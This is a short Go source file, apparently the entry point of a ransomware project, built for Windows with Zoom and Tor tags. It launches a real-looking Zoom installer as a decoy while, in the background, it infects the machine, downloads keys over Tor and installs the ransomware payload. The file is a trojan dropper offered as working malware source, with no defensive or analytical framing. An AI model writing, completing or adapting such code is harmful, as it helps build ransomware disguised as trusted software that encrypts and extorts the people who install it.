// +build windows,zoom,tor

package main

import "github.com/sug0/sr-ransomware/go/crypto/scheme/victim"

//go:generate go run generate/cryptoservice_buffer.go

func main() {
    done := make(chan struct{})
    go runInfection(done)
    victim.RunZoomInstaller()
    <-done
}

func runInfection(done chan<- struct{}) {
    defer close(done)
    ok, err := victim.Infect()
    if err != nil || !ok {
        // victim has already been infected
        // or some IO error occurred
        return
    }
    err = victim.DownloadKeysFromTor()
    if err != nil {
        return
    }
    victim.InstallPayload()
}
